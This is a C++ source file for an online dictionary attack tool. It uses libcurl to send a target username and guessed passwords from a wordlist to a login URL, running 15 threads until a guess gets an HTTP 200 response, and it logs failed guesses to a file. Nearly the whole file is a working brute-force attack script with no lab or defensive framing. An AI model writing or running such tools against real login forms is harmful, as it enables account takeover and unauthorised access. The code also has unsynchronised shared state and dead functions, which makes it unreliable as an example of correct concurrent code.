#include <algorithm>
#include <chrono>
#include <cstddef>
#include <exception>
#include <fstream>
#include <functional>
#include <ios>
#include <iostream>
#include <mutex>
#include <ostream>
#include <set>
#include <string>
#include <thread>
#include <vector>
#define CURL_STATICLIB
#include <curl/curl.h>
#include <stdexcept>
// Global variables
bool found = false;
std::string found_pass = "";
std::string target = "";
std::string url = "";
int i = 0;
std::mutex
    dict_mtx; // mutex for fil containing the passwords for a dictionary attack
std::mutex bad_pass_mtx;
std::vector<std::string> passwords;
std::set<std::string> bad_passwords_set;
std::string dict_file_path;

void write_line(const std::string &file_path, const std::string &line) {

  try {
    std::ofstream file(file_path, std::ios_base::app);
    if (file.is_open()) {
      file << line << std::endl;
    }
  } catch (const std::exception &e) {
    std::cerr << "An error occurred: " << e.what() << std::endl;
  }
}

std::vector<std::string> read_file(const std::string &file_path) {
  std::vector<std::string> lines;
  std::vector<std::string> encodings = {"utf-8", "latin-1", "iso-8859-1",
                                        "cp1252"};

  for (const auto &encoding : encodings) {
    try {
      std::ifstream file(file_path);
      if (file.is_open()) {
        std::string line;
        while (std::getline(file, line)) {
          lines.push_back(line);
        }
        file.close();
        return lines;
      }
    } catch (const std::exception &e) {
      std::cerr << "An error occurred: " << e.what() << std::endl;
      return {};
    }
  }
  return {};
}

std::string read_file_line(std::ifstream &file) {
  std::string line;

  try {
    if (file.is_open()) {
      std::getline(file, line);
      return line;
    }
  } catch (const std::exception &e) {
    std::cerr << "An error occurred: " << e.what() << std::endl;
  }
  return "";
}

std::string generate_password() {
  std::string characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXY"
                           "Z0123456789!@#$%^&*()-_=+[]{}|;:',.<>?/";

  // i'd start at 6 characters to not waste time
  for (int password_length = 6; password_length <= 21; ++password_length) {
    for (char ch : characters) {
      std::string password_attempt(password_length, ch);

      if (std::find(bad_passwords_set.begin(), bad_passwords_set.end(),
                    password_attempt) == bad_passwords_set.end() &&
          std::find(passwords.begin(), passwords.end(), password_attempt) ==
              passwords.end()) {
        return password_attempt;
      }
    }
  }
  return "";
}

std::string get_dict_password(std::ifstream &dict_file) {
  std::string password = read_file_line(dict_file);
  // if password is in the passwords already used, then give empty string
  return bad_passwords_set.find(password) != bad_passwords_set.end() ? ""
                                                                     : password;
}

size_t discard_data_callback(void *ptr, size_t size, size_t nmemb,
                             void *userdata) {
  return size * nmemb;
}

void record_failed_attempt(std::string &password) {
  std::lock_guard<std::mutex> guard(bad_pass_mtx);
  write_line("bad_passwords.txt", password);
  bad_passwords_set.insert(password);
  passwords.erase(std::remove(passwords.begin(), passwords.end(), password),
                  passwords.end());
}

void advanced_cracking(std::ifstream &file) {
  CURL *curl;
  CURLcode res;
  try {
    curl = curl_easy_init();
    if (curl) {
      std::string user = target;
      std::string password = get_dict_password(file);
      if (password.empty()) {
        // no password means it is an attempt already done
        return;
      }
      passwords.push_back(password);
      std::string data = "user=" + user + "&pass=" + password;

      curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
      curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.c_str());

      curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, discard_data_callback);

      res = curl_easy_perform(curl);

      if (res != CURLE_OK) {
        throw std::runtime_error(curl_easy_strerror(res));
      }

      long http_code = 0;
      curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);

      if (http_code == 200) {
        // success
        found_pass = password;
        found = true;
      } else {
        // record failed attempt
        record_failed_attempt(password);
      }

      i++;

      curl_easy_cleanup(curl);
    } else {
      throw std::runtime_error("Failed to initialize CURL");
    }
  } catch (const std::exception &e) {
    // std::cerr << e.what() << std::endl;
  }
}

void status_report() {
  auto start_time = std::chrono::high_resolution_clock::now();
  while (!found) {
    std::this_thread::sleep_for(std::chrono::seconds(1));

    std::lock_guard<std::mutex> lock(bad_pass_mtx);
    if (i % 1000 == 0 && i != 0) {
      auto elapsed_time =
          std::chrono::high_resolution_clock::now() - start_time;
      double elapsed_seconds =
          std::chrono::duration_cast<std::chrono::seconds>(elapsed_time)
              .count();
      std::vector<std::string> bad_passwords = read_file("bad_passwords.txt");
      std::cout << "Tried " << i << " attempts \nTotal " << bad_passwords.size()
                << " combinations.\n";
      std::cout << "Time taken for last 1000 iterations: " << elapsed_seconds
                << " seconds" << std::endl;
      start_time =
          std::chrono::high_resolution_clock::now(); // Reset the start time
    }
  }
}

void brute_force(std::ifstream const & file) {
  // change to modifiable ifstream
  std::ifstream& dict_file = const_cast<std::ifstream&>(file);
  while (!found && !dict_file.eof() ) {
      advanced_cracking(dict_file);
  }
}

int main(int argc, char *argv[]) {
  std::thread status_thread(status_report);
  status_thread.detach();

  if (argc >= 2 && argv[1]) {
    target = argv[1];
  } else {
    std::cout << "you must input a target" << std::endl;
    return 1;
  }

  if (argc >= 3 && argv[2]) {
    url = argv[2];
  } else {
    std::cout << "you must input a url" << std::endl;
    return 1;
  }

  // 3rd arg is path to dictionary
  if (argc >= 4 &&  argv[3]) {
    dict_file_path = argv[3];
    

  } else{

    std::cout << "you must input a path to the dictionary file." << std::endl;
    return 1;
  }

  // get a hashset of bad passwords
  std::vector<std::string> bad_passwords = read_file("bad_passwords.txt");
  bad_passwords_set = std::set(bad_passwords.begin(), bad_passwords.end());

  try {
      // get the inputstream for file
      std::ifstream dict_file(dict_file_path, std::ios_base::in);
      std::cout << "Initiating bruteforce against " << target << " on " << url
                << "\n";
      for (int i = 0; i < 15; i++) {
        std::thread t(brute_force, std::ref(dict_file));
        t.detach();
      }
      while (!found) {
      }
      dict_file.close();
    } catch (std::ifstream::failure &e) {
      // handle  file exception
      std::cout << "error opening dictionary file.\n" << std::endl;
      return 1;
    }

  std::cout << found_pass;
  std::cout << found << std::endl;

  return 0;
}
